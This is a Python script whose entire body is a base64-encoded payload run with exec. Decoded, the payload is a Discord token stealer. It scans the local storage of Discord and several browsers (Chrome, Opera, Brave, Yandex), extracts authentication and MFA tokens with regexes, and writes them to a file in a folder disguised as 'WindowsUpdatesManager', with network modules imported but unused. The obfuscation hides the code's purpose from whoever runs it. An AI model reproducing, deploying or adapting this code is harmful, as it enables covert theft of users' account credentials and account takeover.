import base64

exec(base64.b64decode("aW1wb3J0IG9zDQppbXBvcnQgcmUNCmltcG9ydCBqc29uDQoNCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4NCg0KcGF5bG9hZCA9IE5vbmUNCg0KZGVmIGZpbmRfdG9rZW5zKHBhdGgpOg0KICAgIHBhdGggKz0gJ1xcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYicNCg0KICAgIHRva2VucyA9IFtdDQoNCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIocGF0aCk6DQogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOg0KICAgICAgICAgICAgY29udGludWUNCg0KICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtmaWxlX25hbWV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChyJ1tcdy1dezI0fVwuW1x3LV17Nn1cLltcdy1dezI3fScsIHInbWZhXC5bXHctXXs4NH0nKToNCiAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gcmUuZmluZGFsbChyZWdleCwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgIHRva2Vucy5hcHBlbmQodG9rZW4pDQogICAgcmV0dXJuIHRva2Vucw0KDQpkZWYgbWFpbigpOg0KICAgIGdsb2JhbCBwYXlsb2FkDQogICAgbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpDQogICAgcm9hbWluZyA9IG9zLmdldGVudignQVBQREFUQScpDQoNCiAgICBwYXRocyA9IHsNCiAgICAgICAgJ0Rpc2NvcmQnOiByb2FtaW5nICsgJ1xcRGlzY29yZCcsDQogICAgICAgICdEaXNjb3JkIENhbmFyeSc6IHJvYW1pbmcgKyAnXFxkaXNjb3JkY2FuYXJ5JywNCiAgICAgICAgJ0Rpc2NvcmQgUFRCJzogcm9hbWluZyArICdcXGRpc2NvcmRwdGInLA0KICAgICAgICAnR29vZ2xlIENocm9tZSc6IGxvY2FsICsgJ1xcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCcsDQogICAgICAgICdPcGVyYSc6IHJvYW1pbmcgKyAnXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlJywNCiAgICAgICAgJ0JyYXZlJzogbG9jYWwgKyAnXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQnLA0KICAgICAgICAnWWFuZGV4JzogbG9jYWwgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YVxcRGVmYXVsdCcNCiAgICB9DQoNCiAgICBtZXNzYWdlID0gJycNCg0KICAgIGZvciBwbGF0Zm9ybSwgcGF0aCBpbiBwYXRocy5pdGVtcygpOg0KICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocGF0aCk6DQogICAgICAgICAgICBjb250aW51ZQ0KDQogICAgICAgIG1lc3NhZ2UgKz0gZidcbioqe3BsYXRmb3JtfSoqXG5gYGBcbicNCg0KICAgICAgICB0b2tlbnMgPSBmaW5kX3Rva2VucyhwYXRoKQ0KDQogICAgICAgIGlmIGxlbih0b2tlbnMpID4gMDoNCiAgICAgICAgICAgIGZvciB0b2tlbiBpbiB0b2tlbnM6DQogICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ3t0b2tlbn1cbicNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIG1lc3NhZ2UgKz0gJ05vIHRva2VucyBmb3VuZC5cbicNCg0KICAgICAgICBtZXNzYWdlICs9ICdgYGAnDQoNCiAgICBoZWFkZXJzID0gew0KICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLA0KICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4xMSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yMy4wLjEyNzEuNjQgU2FmYXJpLzUzNy4xMScNCiAgICB9DQoNCiAgICBwYXlsb2FkID0ganNvbi5kdW1wcyh7J2NvbnRlbnQnOiBtZXNzYWdlfSkNCg0KICAgIHdpdGggb3BlbihmIntvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpfS9XaW5kb3dzVXBkYXRlc01hbmFnZXIvU25reS1tYWluL3Rva2VuLnR4dCIsICJ3IikgYXMgZjoNCiAgICAgICAgZi53cml0ZShtZXNzYWdlKQ0KDQptYWluKCk="))